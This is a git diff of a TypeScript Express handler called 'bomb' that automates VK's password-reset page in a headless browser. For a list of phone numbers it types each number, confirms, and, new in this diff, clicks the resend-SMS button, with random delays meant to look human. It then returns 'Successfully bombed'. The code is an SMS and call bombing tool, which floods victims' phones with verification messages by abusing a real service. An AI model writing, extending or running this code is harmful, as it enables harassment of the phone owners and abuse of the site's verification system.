@@ -5,6 +5,11 @@ import selectors from "./selectors";
 import range from "./utils/range";
 import fs from "node:fs";
 import doesStrExistOnPage from "./utils/doesStrExistOnPage";
+import clickResendSmsBtn from "./actions/clickResendSmsBtn";
+import inputPhoneNumber from "./actions/inputPhoneNumber";
+import pressEnter from "./actions/pressEnter";
+import confirmFirstTime from "./actions/confirmFirstTime";
+import confirmSecondTimeIfNeeded from "./actions/confirmSecondTimeIfNeeded";
 
 export async function bomb(req: Request, res: Response) {
   const phoneNumbersStr = process.env.PHONE_NUMBERS;
@@ -20,40 +25,18 @@ export async function bomb(req: Request, res: Response) {
     const page = await browser.newPage();
     
     await page.goto("https://id.vk.com/restore/#/resetPassword");
-    await wait(range(1000, 5000));
-  
-    await page.waitForSelector(selectors.phoneNumberInput);
-    await page.type(selectors.phoneNumberInput, phoneNumber);
-    await wait(range(500, 1000));
-    await page.keyboard.down("Enter");
-  
-    await page.waitForSelector(selectors.firstConfirmBtn);
-    await wait(range(1000, 3000));
-    await page.click(selectors.firstConfirmBtn);
-    await wait(5000);
-  
-    const shouldConfirmAgainBtn = await page.$(selectors.secondConfirmBtn);
-    if (shouldConfirmAgainBtn) await page.click(selectors.secondConfirmBtn);
-    console.log(shouldConfirmAgainBtn);
     
-    await wait(5000);
+    await inputPhoneNumber(page, phoneNumber);
+    await pressEnter(page);
+    
+    await confirmFirstTime(page);
+    await confirmSecondTimeIfNeeded(page);
+    
+    await clickResendSmsBtn(page);
 
-    const hasCalled = await doesStrExistOnPage(page, "Last 4 digits");
-    const hasTexted = await doesStrExistOnPage(page, "We have sent a text message");
-
-    if (hasCalled) {
-      console.log("calling");
-    } else if (hasTexted) {
-      console.log("sent text msg");
-    } else throw new Error(`neither code delivery behavior is detected`);
-
-    await wait(range(1000, 5000));
-
-  
-
-
+    await wait(range(5000, 6000));
   }
-  // await browser.close();
+  await browser.close();
 
   res.status(200).send("Successfully bombed");
 }
